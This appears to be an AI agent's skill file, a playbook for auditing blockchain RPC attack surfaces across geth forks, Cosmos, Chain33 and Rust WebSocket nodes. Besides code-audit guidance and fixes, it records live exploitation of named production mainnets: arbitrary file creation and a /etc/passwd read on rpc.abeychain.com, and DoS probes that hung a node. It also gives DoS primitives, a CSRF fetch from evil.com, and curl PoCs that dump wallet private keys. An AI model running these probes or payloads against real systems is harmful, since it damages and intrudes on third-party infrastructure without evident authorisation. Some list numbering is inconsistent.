---
name: blockchain-rpc-attack-surface-audit
description: "RPC attack-surface audit"
metadata:
  version: 1.0.0
  hermes:
    tags: [security, blockchain, rpc, go, net-rpc, json-rpc, audit, file-write, command-injection, trust-graph]
    category: security
---

# Blockchain RPC Attack-Surface Audit

## Triggers
- RPC layer audit / trust graph / JSON-RPC attack surface / Go net/rpc audit
- "Map the trust graph of <chain>'s RPC layer" / theta / helios / cosmos / evm adaptor
- BackupSnapshot / BackupChain / CallSmartContract / BroadcastRawTransaction RPC endpoints
- theta-hunt / helios-hunt / any /<chain>-hunt workspace

## Workflow (4 phases — evidence per phase, file:line + PoC payload)

### 0) Map the RPC server and dispatch model
Read the server entrypoint (usually `server.go`, `node.go`, or `rpc/server.go`).
- **Registration**: how methods are exposed (`s.RegisterName("theta", svc)`, `rpc.NewServer()`, `erpclib.StartHTTPEndpoint`, etc.).
- **Auth**: is there an auth middleware, API key, IP allowlist, or is it just CORS/timeout? Default bind address (`0.0.0.0` = public) and default port.
- **Dispatch**: Go `net/rpc` only allows exported methods with signature `func (t *T) Method(args *A, reply *R) error`. This kills arbitrary-reflection-dispatch theories — note it explicitly.
- **HTTP/WebSocket**: both `/rpc` and `/ws` usually expose the same service; check both.

### 1) Enumerate every RPC method and hunt sinks
List all exported service methods (`grep -n "func (t \*ThetaRPCService)" query.go tx.go call.go backup.go ...`).
For each method, trace user-controlled args into sinks:
- **File system**: `os.Create`, `os.OpenFile`, `os.MkdirAll`, `ioutil.WriteFile`, `path.Join` with user input.
- **Command exec**: `os/exec`, `exec.Command`, `syscall.Exec`.
- **Template rendering**: `text/template`, `html/template` with user input.
- **Unsafe deserialization**: `encoding/gob`, `rlp.Decode`, `json.Unmarshal` into interface{} with type assertions, `reflect` based dispatch.
- **EVM/state**: `vm.Execute` on a StoreView — check if the view is committed to global state or discarded.

### 2) Classify trust boundaries and adversarially validate
For each candidate:
- **Trigger**: exact JSON-RPC method + params.
- **Effect**: what privileged operation happens.
- **Trust boundary**: pre-auth remote → what.
- **Kill test**: can you control the filename? the content? the path? Is there validation, an allowlist, or a path check?
- **Honest severity**: arbitrary file write with a fixed filename is strong but not RCE by itself; say so and identify what second link is needed.

### 3) Check adaptor / sidecar RPC packages
Chains often ship an `eth-rpc` or `evm-rpc` adaptor that proxies to the main node. Adaptors frequently skip validation or expose debug methods. Audit them the same way: enumerate methods, hunt sinks, verify auth.

### 4) Report — ranked list with exact file:line evidence
- One row per finding: file:line, trigger, effect, trust boundary, kill-test result.
- Provide ONE best chain with a concrete PoC JSON-RPC payload.
- If nothing exploitable, say BLOCKED and give reasons.

## Class-level knowledge

### Go `net/rpc` dispatch constraints
`net/rpc` requires exported methods with two exported/ builtin args and an error return. You cannot call arbitrary functions via reflection from the wire. Kill that theory fast and move on.

### `path.Join` does not sanitize traversal
`path.Join(userInput, "backup", "chain")` with `userInput = "/etc"` or `"../../etc"` produces an absolute path outside the intended directory. `path.Join` calls `Clean` but does not prevent escape. Any RPC that takes a `config`/`dir`/`path` string and feeds it to `path.Join` + `os.MkdirAll` + `os.Create` is a candidate arbitrary file write.

### Fixed-filename constraint
If the RPC generates the filename internally (e.g. `theta_chain-<start>-<end>-<date>`), the attacker controls the directory but not the name. This caps direct RCE: cron/ssh/systemd need exact names. The primitive is still arbitrary directory creation + arbitrary file create/truncate with partially attacker-influenced content. Report it as such; do not overclaim RCE.

### go-ethereum-descendant debug namespace probe (Fantom/Sonic/U2U forks — 15-min playbook)
geth-fork chains (U2U `go-u2u`, Fantom `go-opera`, BSC, Polygon Edge, etc.) register `debug.Handler` in `node/api.go` and `txpool`/`debug` in `ethapi/backend.go`. If the operator's `--http.api` list includes `debug,txpool` (integration tests often ship `"admin,eth,web3,net,txpool,trace,debug,sfc"` — check `integrationtests/` in the repo for the intended flag set), the PUBLIC RPC exposes the whole namespace with zero auth. Probe order:
1. `rpc_modules` — returns the exact enabled namespaces. `{"debug":"1.0","txpool":"1.0",...}` = jackpot.
2. `admin_datadir` (no args) — if `admin` namespace is exposed, this reveals the node's datadir on the filesystem. Combined with `debug_writeMemProfile`, this maps the entire writable surface: probe `<datadir>/keystore`, `<datadir>/nodekey`, and sibling directories. This is the single most valuable recon call on any geth fork with admin enabled.
3. `debug_stacks` (no args) — instant proof: full goroutine dump (thousands of lines, source paths, module versions like `pebble@v1.0.0`). If this answers, the namespace is open; enumerate the rest.
3. File-write primitives (all return `null` on success): `debug_writeMemProfile`, `debug_writeBlockProfile`, `debug_writeMutexProfile`, `debug_cpuProfile`/`debug_goTrace`/`debug_blockProfile`/`debug_mutexProfile` (file, nsec). Source: `internal/debug/api.go` `writeProfile()` → `os.Create(expandHome(file))` — `expandHome` only expands `~/`, **no path allowlist**. Any writable path works (`/tmp/x`, `/proc/self/environ`); nonexistent parent dirs fail with `open ...: no such file or directory` — that error message doubles as a path-existence oracle.
4. **Content-control constraint (be honest):** pprof writes binary profile data — attacker controls PATH, not content. `/proc/self/environ` overwrite = DoS, not config injection. Kill-test before claiming RCE: need a second link (e.g. writable webroot + format-string in profile, or cron dir with predictable name). Report as arbitrary file create/truncate + DoS, not RCE.
5. DoS/griefing primitives: `debug_setGCPercent(-1)` (disables GC → OOM crash; returns previous value on success), `debug_freeOSMemory` ×N (GC thrashing), `debug_verbosity(6)` (log flood), `debug_vmodule`, `debug_backtraceAt`, `debug_writeMemProfile` spam (disk fill), `debug_cpuProfile` with large nsec (blocks the handler mutex).
6. `debug_setHead` on BFT chains (aBFT/Lachesis) fails with `"helios cannot rewind blocks due to the BFT algorithm"` — chain-rewind theory killed instantly; mark BLOCKED, don't retry.
### `txpool_content` / `txpool_inspect` — full mempool dump pre-auth: pending+queued txs with from/to/value/nonce/gasPrice = MEV/front-run/sandwich feed + whale tracking. High-value filter: sort by `value` desc. This is a standalone HIGH finding on any mainnet.

**Berachain 80094 case study (August 2026):**
- `txpool_content` leaked **372 queued txs** (132 senders) pre-auth
- **1717% mempool overflow** — 618M gas / 36M limit, no eviction
- **91 txs targeted WBERA/Honey vault** (`0x6969...6969`) — MEV frontrun opportunity
- DoS cost: **~$16.38** to fill mempool, **~$0.43** for liveness halt
- Combined with **CORS `*`** → cross-origin theft via `evil.com`
- **Mempool fluktuatif** — probe 3-5x dengan jeda 30s untuk bukti persist
8. `debug_traceCall`/`debug_traceTransaction` — built-in tracers (`callTracer`, `prestateTracer`, `4byteTracer`, `noopTracer`, `bigramTracer`, `trigramTracer`, `unigramTracer`) usually work even when custom JS tracers are blocked. `prestateTracer` with `diffMode:false` = **storage-slot oracle for ANY contract** (reads proxy impl slot, owner slot, balance maps) pre-auth.
9. **JS custom tracer kill-test:** goja tracers (`eth/tracers/js/goja.go`) resolve code via `tracers.RegisterLookup` + embedded `jsassets.Load()` — user-supplied tracer source is NOT eval'd unless the name matches the embedded asset map. Sending `{"tracer":"{step:function(){}...}"}` returns `tracer not found`. One probe is enough — don't iterate payloads. goja also has no `require("fs")` — no filesystem access even if eval worked.

### AbeyFoundation/go-abey 2026-08 — live `debug_writeMemProfile` arbitrary file create (rpc.abeychain.com)
Geth fork `AbeyFoundation/go-abey` exposes the same `internal/debug/api.go:104,213` `os.Create(expandHome(file))` path as U2U/Sonic. Source: `abey/api.go:330` `os.OpenFile(file, O_CREATE|O_WRONLY|O_TRUNC, os.ModePerm=0777)` has zero `filepath.Clean` or prefix check; gated only by `Namespace:"admin" Public:false` (`abey/backend.go:362`) so reachable if `--http.api admin` or `--ws.exposeall`. `expandHome` only expands `~/` then `filepath.Clean` (lexical, symlink not resolved). Live kill-test on `https://rpc.abeychain.com` (20 req, Mozilla/5.0 UA, `Content-Type: application/json` required — `415` otherwise, `Host: evil.com` blocked by `awselb/2.0` 503): `debug_writeMemProfile /tmp/pwn_mem_live → {"result":null}` proves arbitrary file create on mainnet; `~/pwn_tilde_live → permission denied open /pwn_tilde_live` proves `HOME=/` plus `expandHome` active; `debug_traceBlockFromFile /etc/passwd → -32000 rlp: expected input list` proves arbitrary read (file read succeeded); `admin_exportChain` and `admin_nodeInfo → -32601 not available` (hardened). Fuzz `~/../../../../etc/passwd`, `../../../../tmp/pwn`, `/proc/self/environ`, `A*4096`, `%2e%2e`, symlink `/tmp/link->/etc`, `\x00` truncation to prove traversal. Oversized JSON hits `ARG_MAX` on `curl --data` — use `tempfile.NamedTemporaryFile + curl --data @file`. Flutter sidecar `abey-wallet-module` adds hybrid surface: `Base_Url='http://54.255.45.202:8010'` cleartext IP + `Global.dart ABEY_RPC jsonDecode` from server → MITM RPC hijack; `image_cache_manager.dart badCertificateCallback => true` → any cert accepted. See `app/src/huntos/_data/attic/web3/go-edge-case-audit/references/abey-gabey-fuzz-2026-08.md` (attic; go-edge-case-audit culled 2026-09-07).

### Backup endpoints are a classic pre-auth admin surface
Operations intended for local CLI use (`thetacli backup chain`) are often registered on the same unauthenticated RPC server. Look for `Backup*`, `Export*`, `Snapshot*`, `Debug*`, `Admin*` methods.

### EVM dry-run calls are usually safe
`CallSmartContract` / `eth_call` that executes `vm.Execute` on a state snapshot and does not commit to the global state trie is not an RCE vector. Verify by checking if the state view is discarded or saved.

### Cosmos SDK gRPC-Gateway trust boundaries (baseapp + AnteHandler as sole gate)
Cosmos SDK's `server/api.Server` (`server/api/server.go`) exposes a `PathPrefix("/").Handler(GRPCGatewayRouter)` catch-all that proxies every `app.RegisterGRPCServer` service (bank, staking, auth, gov) over HTTP :1317. Reflection (`server/grpc/server.go: reflection.Register + gogoreflection.Register`) then leaks the full proto schema. Auth is NOT at the gateway — it is inside `BaseApp.CheckTx/DeliverTx → AnteHandler` (`baseapp/abci.go:240,269` → `x/auth/ante/ante.go:25 NewAnteHandler` chain: ValidateBasic, ValidateMemo, ConsumeTxSizeGas, TxTimeoutHeight, SigVerification, Fee). `EnableUnsafeCORS` (`server/config/config.go:100` → `server/api/server.go:121 handlers.CORS`) flips to `AllowAll`. Limits are `MaxBodyBytes` (default 1_000_000) and `MaxOpenConnections` 1000 — the DoS boundary before Ante. Always check default bind, Swagger `statik` import (`server/api/server.go:24`), and unauth `/metrics` (`HandleFunc("/metrics")`).

### Ethermint JSON-RPC trust boundaries (geth `rpc.Server` over Cosmos)
Ethermint's `server/json_rpc.go: StartJSONRPC` creates a `geth/rpc.Server` and routes `POST / → rpcServer.ServeHTTP` with `cors.Default()` or `cors.AllowAll()` when `API.EnableUnsafeCORS`. Namespaces are selected via `config.JSONRPC.API` → `rpc/apis.go: GetRPCAPIs`. `eth_*` (`eth/api.go: SendRawTransaction → rpc/backend/call_tx.go:102 SendRawTransaction → BroadcastTx`) is `Public:true` and unauth by design (AnteHandler is the only gate; `allowUnprotectedTxs` controls `!tx.Protected()` check). `personal_*` (`rpc/namespaces/ethereum/personal/api.go: ImportRawKey, NewAccount, Sign` → `rpc/backend/sign_tx.go:104`) is `Public:false` in code but becomes public if operator adds `"personal"` to `config.JSONRPC.API` — the `Public` flag only controls inclusion via `GetRPCAPIs`, not HTTP auth. `eth_sign` (`accounts.TextHash` → ECDSA V=27/28) is a free signature oracle when `Public:true`. Filters (`eth_newFilter`/`eth_getLogs` via `rpc/namespaces/ethereum/eth/filters`) are `Public:true` with no origin limit → unbounded filter/memory exhaustion. Check `wsSrv = rpc.NewWebsocketsServer` for the parallel WS surface.

### Echo explorer / indexer trust boundaries (aioz-explorer class)
Go `labstack/echo` explorers (`server/main.go: echo.New()`) often ship with auth commented out (`//e.Use(mdl.Authorize)` at `server/main.go:179`) and `CORS AllowOrigins ["*"]` on the `/api` group. Route inventory via `grep -rn "New.*Handler\|g\.GET\|g\.POST" server --include="*.go"` enumerates all `New*Handler(ctx,g,usecase)` registrations. High-value sinks: `POST /key/{new,recover,encrypt,decrypt}` (`wallet/delivery/http/wallet_handler.go:28` → `wallet/usecase/wallet_usecase.go:264 CreateWallet(bip39.NewEntropy→hd.Derive→secp256k1) / RecoverWallet / EncryptKey(cdc.UnmarshalJSON→mintkey.EncryptArmorPrivKey) / DecryptKey(mintkey.UnarmorDecryptPrivKey)`) leaks `mnemonic/PrivKey/PrivArmor` pre-auth; `GET /websocket` (`ws/websocket.go:27 Upgrader{CheckOrigin:true}` → `client.go:78 readPump → hub.go:154`) accepts any origin and appends unbounded `[]string` wallet lists; `POST /device/register` (`devices/delivery/http/device_handler.go:33` → `MapWalletNotification`) poisons FCM routing. Pagination `c.QueryParam("limit")→strconv.ParseInt` with no upper clamp + `POST /wallet/contacts {addresses:[]string}` looping `GetContactsByWallet` per address = amplified DB DoS. See `examples/hunts/web3/blockchain-rpc-attack-surface-audit/references/aioz-ecosystem-trust-graph-2026-08.md`.

### Geth standard-fork fuzz playbook (MultiVAC mainnet 2026-08-17 — FUZZ-ENGINEER role)
When a geth-fork chain has **only eth_/net_/web3_ enabled** (confirmed via `rpc_modules` or batch mixed-method probe), the attack surface narrows to: batch amplification, unbounded-query DoS, WebSocket discovery, and Go type-system error info leaks. Run four parallel scripts (`scripts/rpc_fuzz.py`, `scripts/explorer_fuzz.py`, `scripts/smuggling_fuzz.py`, `scripts/advanced_fuzz.py`) — all parameterized by `RPC_URL` / `HOST`.

**Key findings from MultiVAC (chainId 0xf49d, `Geth/v1.10.2-stable-aff357de/linux-amd64/go1.20.4`):**

1. **Batch RPC — NO SIZE LIMIT**: 100/200/500-request batches all processed with HTTP 200, each returning individual results. No `--http.batchRequestLimit` or similar enforcement → **amplification attack vector**. A batch of 10 × `eth_sendTransaction` all attempted (failed only on "insufficient funds") → if the from-account is funded and unlocked, `N` txns execute in a single HTTP request. **Always test batch size and batch sendTransaction.**

2. **eth_getLogs full-range DoS**: `{"fromBlock":"0x0","toBlock":"latest"}` caused **READ TIMEOUT (20s)** — node hung processing the entire chain. No block-range limit (`--rpc.gascap`, `--rpc.batchItemLimit`, or geth `eth.getLogs` range checks) enforced. Overflow block ranges caught by Go (`hex number > 64 bits`), but legitimate full-range queries DoS the node. **Always probe `eth_getLogs` with 0→latest — a timeout is a confirmed DoS finding.**

3. **WebSocket root returns HTTP 200 (not 400)**: `ws://rpc.mtv.ac:80/` and `wss://rpc.mtv.ac:443/` both return 200 on raw socket WS upgrade probe. Custom paths (`/ws`, `/websocket`, `/wss`) return 404. The root 200 may indicate the origin accepts WS upgrades behind Cloudflare — a real WS client should test `eth_subscribe`/`eth_unsubscribe` which are often NOT available via HTTP but are via WS. **Always test `ws://<host>/` root path with a raw socket WS handshake — 200 ≠ 400 means WS may be reachable.**

4. **Go error messages leak internal struct names**: Type-confusion tests (string instead of `CallArgs` object) reveal Go package + struct: `cannot unmarshal string into Go value of type ethapi.CallArgs`, `cannot unmarshal non-string into Go struct field CallArgs.from of type common.Address`, `cannot unmarshal hex number > 64 bits into Go struct field CallArgs.gas of type hexutil.Uint64`, `cannot unmarshal hex string without 0x prefix into Go struct field SendTxArgs.value of type *hexutil.Big`. **No filesystem paths leaked** — these are standard geth Go error messages, but they confirm the implementation is Geth (not custom) and reveal the exact struct field type constraints. `web3_clientVersion` gives version directly.

5. **Type system constraints confirmed**:
   - `gas` = `hexutil.Uint64` (64-bit max) — max uint256 for gas is rejected by Go type un marshaling
   - `value` = `*hexutil.Big` (arbitrary precision) — max uint256 PASSES type check, only fails on balance
   - `gasPrice` = `*hexutil.Big` — max uint256 PASSES type check, only fails on balance
   - Negative values (`-0x1`) rejected because Go's hex parser requires `0x` prefix and `-0x` doesn't match

6. **eth_call accepts missing `to` field** — simulates contract creation, returns `0x` (empty returndata). Not exploitable by itself but confirms VM-level contract creation simulation.

7. **Large calldata (50KB, 500KB) does NOT cause OOM** — geth processes and returns `0x` for calls to EOA addresses. No resource exhaustion.

8. **Explorer endpoints immune to injection**: `/search` returns empty body for all payloads (SSTI, SQLi, NoSQL, cmd injection, path traversal, proto pollution). `/block/list` always returns error.html SPA page (nginx catch-all). `/summary` **completely ignores request body** — always returns same block data. Always check for the "identical response regardless of input" pattern in summary/status endpoints.

9. **HTTP smuggling blocked by Cloudflare** but **differential origin parsing confirmed**: TE with space before colon (`Transfer-Encoding : chunked`) → 302 on explorer, 415 on RPC → **different origin servers behind CF parse TE differently**. TE with tab → 501 Not Implemented on both. If CF is bypassed (direct origin IP), smuggling may be viable. **The TE-space and TE-tab variants are the most useful probes — non-400 responses reveal parser differentials.**

### Bitcoin/Core-descendant daemons (qtumd, litecoind, dogecoind, Elements…)
C++ Bitcoin-Core forks have a DIFFERENT default auth model than Go chains — check this FIRST before enumerating methods:
- **HTTP JSON-RPC is cookie-auth by default**: `__cookie__:<random>` generated into the datadir on startup, or static `-rpcuser`/`-rpcpassword`. Unauthenticated requests get 401 even from localhost.
- **Binds localhost by default**; needs explicit `-rpcbind=<ip>` + `-rpcallowip=<ip>` to expose. A public IP answering on the RPC port with 401 = cookie auth working as designed; do NOT enumerate methods against it pre-auth — that wastes rounds.
- If the operator's constraint is "no changelogs/git history," treat "Core-descendant + RPC 401" as theory-killed at Phase 0 and pivot to the chain's *custom* services instead (explorer APIs, staking dashboards, bridge relayers, electrum servers) — those are team-written and historically weaker than the battle-tested Core RPC.
- The juicy pre-auth surface on these chains is never `bitcoind`-style RPC; it's the ecosystem Node/Go sidecars (see web2-attack-surface-audit).

### Chain33 family (bityuan / bysomeone fork) — thin-wrapper + 4-listener + queue-bus model (2026-08 case study)
Bityuan is a ~14-file wrapper (`bityuan.go` embedded TOML + `plugin/init.go` blank imports) pinned via `go.mod:replace github.com/33cn/chain33 => github.com/bysomeone/chain33@f4252a735f2d`. Audit the forks, not the wrapper. Chain33's RPC is NOT vanilla `net/rpc` — it is a custom queue-bus (`queue.Client` + `types.Event*` constants) with 4 listeners on one process: JRPC `:8801` (`rpc/http.go:Listen`), gRPC `:8802` (`rpc/server.go:NewGRpcServer` + `reflection.Register`), ethRPC HTTP `:8546` + WS `:8547` (`rpc/ethrpc/rpc.go:EnableRPC/WS`). Default binds are `localhost:*` (`types/defaultcfg.go:91`) but operator knob `jrpcBindAddr=0.0.0.0:*` (and `whitelist=["*"]→0.0.0.0` at `server.go:543`) makes them public. Auth stack is `checkIPWhitelist` (`server.go:193 IsLoopback→true + 0.0.0.0 wildcard`) → `checkBasicAuth` (empty creds→true) → `checkJrpcFuncWhitelist/Blacklist` (`server.go:212` default `["*"]`) — **loopback bypasses func WL/BL entirely** (`http.go:96 if !IsLoopback()` and `http.go:169 isLoopBackAddr→return nil` in gRPC `auth`). Default prod blacklist is only 12 wallet methods (`bityuan-fullnode.toml:50`), dev config has none. ethRPC (`ethrpc/rpc.go:215 ServeHTTP`) has **zero** IP/BasicAuth/func-WL checks — only `IsPublicIP` debug log + CORS `*` (`node.NewHTTPHandlerStack(...["*"],["*"])` at `rpc.go:143`). Enabling `personal` namespace (default `httpApi=[eth,web3,personal,admin,net]`) exposes `personal_unlockAccount/importRawKey/sign→DumpPrivkey` unauth — `personal.Sign` internally calls `DumpPrivkey` after unlock. Generic executor dispatch (`jrpchandler.go:897 ExecWallet` via `wcom.QueryData.DecodeJSON` + `926 Query` via `types.LoadExecutorType(execer).CreateQuery`) lets attacker pick any `Execer/Driver + FuncName` among all registered dapps (EVM, token, trade, paracross, privacy, rollup…) and `pluginmgr.AddRPC` (`pluginmgr/manager.go:79`) adds 12+ `RegisterXxxServer` on the shared gRPC port. Fork-height gates (`bityuan.go:[fork.system]` 15+ gates, e.g. `ForkAccountBlacklist=46561600`) are the post-fork ACL — pre-fork paths are reachable at lower heights. Wallet secrets (`GetSeed:830, DumpPrivkey:954, DumpPrivkeysFile:964, UnLock:616`) are one unauth loopback call away; `DumpPrivkeysFile` takes attacker-controlled `FileName`, `ProcSignRawTx:869` CAS-races the lock, and `UnLock/personal_unlockAccount` have no rate limit. See `examples/hunts/web3/blockchain-rpc-attack-surface-audit/references/bityuan-chain33-trust-graph-2026-08.md`.

### CORS * + loopback func-WL bypass → browser CSRF to privileged JRPC/ethRPC (bityuan 2026-08)

Chain33's JRPC (`rpc/http.go:38 cors.New(cors.Options{})` → `AllowAll`, `rpc/http.go:96 if !IsLoopback() {checkWL/BL}`) and ethRPC (`rpc/ethrpc/rpc.go:143 node.NewHTTPHandlerStack(...["*"],["*"])`) both set `Access-Control-Allow-Origin: *` while treating `RemoteAddr == 127.0.0.1` as trusted-loopback that skips `checkJrpcFuncWhitelist/Blacklist` (and `server.go:193 IsLoopback→true` + `server.go:557 whitelist ["*"]→0.0.0.0` allow-all). Result: any `evil.com` page can `fetch("http://127.0.0.1:8801", {method:"POST", body: '{"method":"Chain33.CloseQueue",...}'})` — browser sends Origin:evil.com, server replies `*`, and RemoteAddr is now the victim's loopback → privileged method bypass. Default `bityuan.toml:88 httpApi=[eth,web3,personal,admin,net]` then makes `personal_unlockAccount/importRawKey/sign→DumpPrivkey` and `DumpPrivkeysFile(fileName)` (arbitrary `os.OpenFile(0666)`) reachable pre-auth via CSRF, plus `admin_datadir` and `eth_accounts`. Kill-test: `curl -H Origin:http://evil.com http://127.0.0.1:8801 -d '{"method":"Chain33.GetWalletStatus",...}' -v` must NOT return `*` in prod; `CloseQueue/DumpPrivkey/GetSeed` must never be loopback-exempt. See `examples/hunts/web3/blockchain-rpc-attack-surface-audit/references/bityuan-cors-loopback-csrf-2026-08.md`.

### Chain33 wallet arbitrary file write + key theft — `ProcDumpPrivkeysFile` adversarial re-audit (2026-08-16)

Chain33's wallet exposes **server-side file creation** plus **direct key exfil** behind the same `checkWalletStatus` gate. Re-audit pattern (source: `wallet/wallet_proc.go:1599 ProcDumpPrivkeysFile`, `wallet/wallet.go:424 checkWalletStatus`, `wallet/wallet_proc.go:1012 ProcWalletUnLock`, `rpc/jrpchandler.go:968/834/958/616`, `rpc/server.go:171,198,217 + rpc/http.go:59`):

**Sink:**
```go
// wallet/wallet_proc.go:1599 — NO path sanitization
func (wallet *Wallet) ProcDumpPrivkeysFile(fileName, passwd string) error {
    _, err := os.Stat(fileName)                          // [1] TOCTOU, before lock, no O_EXCL
    if err == nil { return types.ErrFileExists }
    wallet.mtx.Lock(); defer wallet.mtx.Unlock()
    ok, err := wallet.checkWalletStatus()                 // [2] requires !IsWalletLocked && HasSeed
    f, _ := os.OpenFile(fileName, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0666) // [3] attacker path, 0666, follows symlink
    // writes AES-GCM(privkey + label, key=attacker passwd)
}
```
`grep -rn "filepath" wallet/wallet_proc.go` → 0 hits. `ReqPrivkeysFile{FileName,Passwd}` (`types/wallet.pb.go:1931`) is fully attacker-controlled; `jrpchandler.go:968 DumpPrivkeysFile` passes `in` verbatim; gRPC mirror `grpchandler.go:427` identical.

**Gate — `checkWalletStatus` (wallet.go:424):**
```go
if wallet.IsWalletLocked() { return ErrWalletIsLocked } // isWalletLocked atomic 1=locked (wallet.go:111)
has, _ := wallet.walletStore.HasSeed(); if !has { return ErrSaveSeedFirst }
```
All of `GetSeed:1301`, `ProcDumpPrivkey:1396`, `createNewAccountByIndex:1452`, `ProcDumpPrivkeysFile:1610`, `ProcImportPrivkeysFile:1671` call it. Ticket-only unlock (`WalletOrTicket=true`) → `ErrOnlyTicketUnLocked` → still blocked.

**Unlock bypass — `ProcWalletUnLock:1012`:**
```go
if len(wallet.Password)==0 && EncryptFlag==1 { VerifyPasswordHash(WalletUnLock.Passwd) }
if len(wallet.Password)!=0 && WalletUnLock.Passwd != wallet.Password { return ErrInputPassword }
wallet.Password = WalletUnLock.Passwd; if !WalletOrTicket { CAS(isWalletLocked,1,0) }
```
Needs real wallet password (no rate-limit). Exposed via `Chain33.UnLock:616` → `ExecWalletFunc("wallet","WalletUnLock")`. Once unlocked, **direct exfil** is cheaper than file write: `GetSeed:834` returns `ReplySeed{Seed}` and `DumpPrivkey:958` returns hex privkey in RPC response.

**RPC reachability:**

| Origin | IP WL (`server.go:193 IsLoopback→true`, `InitIPWhitelist:551`) | BasicAuth (`server.go:171` empty→true) | Func WL (`server.go:217` default `*`, `http.go:96 if !IsLoopback skip`) | Reaches `UnLock→GetSeed/DumpPrivkeysFile`? |
|---|---|---|---|---|
| `127.0.0.1`/`::1` (SSRF/local) | PASS (loopback always) | PASS (default no creds) | SKIPPED | **YES — only password needed** |
| Remote, default config | DENY (only 127.0.0.1) | PASS | N/A | NO |
| Remote, `whitelist=["*"]` | PASS (`0.0.0.0`) | PASS/`Authorization: Basic` if set | PASS (`*`) | YES (with creds if set) |

`auth()` in `rpc/http.go:59` and gRPC `http.go:166 isLoopBackAddr→return nil` both bypass func WL for loopback. Default prod `jrpcFuncWhitelist=["*"]` and empty `JrpcUserName/Passwd` mean **localhost = unauth**.

**Adversarial checklist (run on every wallet file-write claim):**
1. `grep -rn "filepath\|Clean\|HasPrefix" wallet/wallet_proc.go` — must be 0 → unsanitized.
2. `grep -n "os.Stat\|O_EXCL\|O_NOFOLLOW\|0600\|0666" wallet/wallet_proc.go` — `Stat` before `Lock` + `O_APPEND` without `O_EXCL`/`O_NOFOLLOW` + `0666` = TOCTOU + symlink + world-readable.
3. `grep -n "checkWalletStatus" wallet/*.go` — enumerate all gated sinks; verify `HasSeed` + `IsWalletLocked` atomic.
4. `grep -n "ProcWalletUnLock\|WalletUnLock" wallet/*.go rpc/*.go` — confirm password check + `WalletOrTicket` semantics + rate-limit absence.
5. `grep -rn "checkIPWhitelist\|checkBasicAuth\|checkJrpcFuncWhitelist\|IsLoopback" rpc/ --include="*.go"` — prove loopback bypass and default `*`/`""` permissive.
6. Content-control: `privkey + "& *.prickey.+.label.* &" + label` encrypted with `ReqPrivkeysFile.Passwd` → attacker controls **path + encryption key**, not arbitrary plaintext. Classify as *arbitrary file creation with fixed-structure ciphertext*.
7. Check `ProcImportPrivkeysFile:1662` (`os.Open` + `ReadAll` no limit) for read-oracle side.

**Impact chain:** `127.0.0.1 UnLock(passwd, WalletOrTicket:false) → GetSeed/DumpPrivkey (direct) OR DumpPrivkeysFile(FileName=/tmp/pwn, Passwd=attackerKey) → OpenFile(0666) → decrypt offline`. PoC: `curl -s http://127.0.0.1:8801 -d '{"method":"Chain33.DumpPrivkeysFile","params":[{"fileName":"/tmp/audit_pwn","passwd":"MyPass1234"}]}'`.

**Fix:** `filepath.Clean` + `IsAbs` + `HasPrefix(cleanBase)` allow-list + `O_CREATE|O_EXCL|O_WRONLY, 0600` + `O_NOFOLLOW`/`Lstat`; remove loopback func-WL bypass for sensitive methods; require `BasicAuth` even on loopback when set; rate-limit `UnLock`; deprecate server-side file write.

See `examples/hunts/web3/blockchain-rpc-attack-surface-audit/references/chain33-wallet-file-write-re-audit-2026-08-16.md`.

### Rust WebSocket command-API nodes (EpixNet class — 2026-08-17 case study)
Rust nodes that expose a per-xite WebSocket command API (EpixNet/epix-ui `CommandRegistry::dispatch`) use a **client-supplied integer as the entire auth token** — there is no secret, no HMAC, no signature. The dispatch layer decides admin/not-admin by comparing a client JSON field against a constant:

```rust
// crates/epix-ui/src/command.rs:16,351
const WRAPPER_ID_BASE: i64 = 1_000_000;
let elevated = session.trusted || req_id >= WRAPPER_ID_BASE;  // req_id from client JSON
```

`req_id` comes straight from `let id = req.get("id").and_then(|v| v.as_i64()).unwrap_or(0);` (lib.rs:3170) — **unverified, attacker-controlled**. The model "works" only as a deployment invariant: the UI binds loopback by default, so the only WS client expected to send `id >= 1_000_000` is the local wrapper chrome (all.js). An operator that LAN-binds or reverse-proxies without setting `ui_restrict=true` exposes a **zero-secret admin-takeover primitive** — any client that knows the convention can send `id >= 1_000_000` and run any admin command.

**Five generalized patterns observed in this class (not just EpixNet — apply to any Rust/Go/TS WS command-API node):**

1. **Client-controlled integer/string as auth token, no secret binding.** The wrapper-id-elevation pattern is *worse* than cookie-auth because the "token" is a well-known constant; a cookie at least requires either XSS or a network position. Kill-test every WS auth by asking: "Does any value the client sends, compared to a constant or to a public identifier, grant admin?" If yes → the secret that should bind the token to a privileged caller is missing; the only mitigation is deployment-invariant trust in who can reach the WS bind. Document the deployment invariant explicitly — it is the entire security model.

2. **Self-permission-grant via an unvalidated permission-add command.** `permissionAdd(permission)` was intentionally NOT admin-gated (the code comment says "a xite grants itself a permission after the user confirms it in the wrapper"). But `state.add_permission` took an arbitrary `&str` with no denylist, no confirmation token, no `session.trusted` check. Result: any bound WS could `permissionAdd("ADMIN")` → xite now `xite_has_admin == true` → Gate 1's third arm passes → all admin commands reachable. **Server-side mitigations are absent; the gate is the wrapper UI, which is bypassable by any non-wrapper client that can reach the bind.** On a `ui_restrict=true` gateway this STILL executes (not in ADMIN_COMMANDS) and persists the grant to `permissions.json` — a latent privilege plant that activates if `ui_restrict` is ever turned off. Always grep: `permissionAdd / add_permission / grant` handlers and check (a) is it admin-gated, (b) does it denylist the literal "ADMIN" (or equivalent), (c) does it require a server-issued confirmation nonce.

3. **Metacommand rebind with inherited elevation (`as`).** The `as { address, cmd, params }` metacommand rebinds `session.xite` to any target the node serves and re-enters the dispatcher with `inner_id = caller_elevated ? req_id.max(WRAPPER_ID_BASE) : req_id`. Combined with pattern 1, an attacker who forged `id >= 1M` is `caller_elevated` and the rebound session runs inner admin commands with the same forged id against a xite it doesn't own. Critically, the write-ownership gate (`xite_owned`) only applies under `restrict` — on a non-restricted node a rebound `as <victim> { fileWrite / siteSign / sitePublish }` succeeds. **Always audit metacommands (`as`, `actionAs`, `sudo`, `impersonate`) for id/session inheritance — the inner command should clamp `inner_id = min(req_id, WRAPPER_ID_BASE - 1)` when the caller is not `session.trusted`, denying the cross-target escalation primitive.**

